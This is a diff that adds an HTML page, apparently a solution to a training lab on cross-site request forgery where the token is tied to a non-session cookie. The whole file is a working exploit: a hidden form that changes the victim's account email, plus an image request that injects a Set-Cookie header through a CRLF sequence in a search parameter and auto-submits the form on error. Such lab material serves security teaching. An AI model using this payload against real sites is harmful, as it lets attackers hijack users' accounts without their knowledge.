@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>
+            Lab: CSRF where token is tied to non-session cookie
+        </title>
+    </head>
+    <body>
+        <script>
+            history.pushState('', '', '/')
+        </script>
+        <form action="https://WEBSITE-URL/my-account/change-email" method="post" id="form-exploit">
+            <input type="text" name="email" value="abcd@normal-user.net">
+            <input type="hidden" name="csrf" value="VALID OBTAINED CSRF TOKEN">
+            <input type="submit">
+        </form>
+
+        <img src="https://WEBSITE-URL/?search=fgnag%0d%0aSet-Cookie:%20csrfKey=OBTAINED-CSRF-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()" >
+    </body>
+</html>
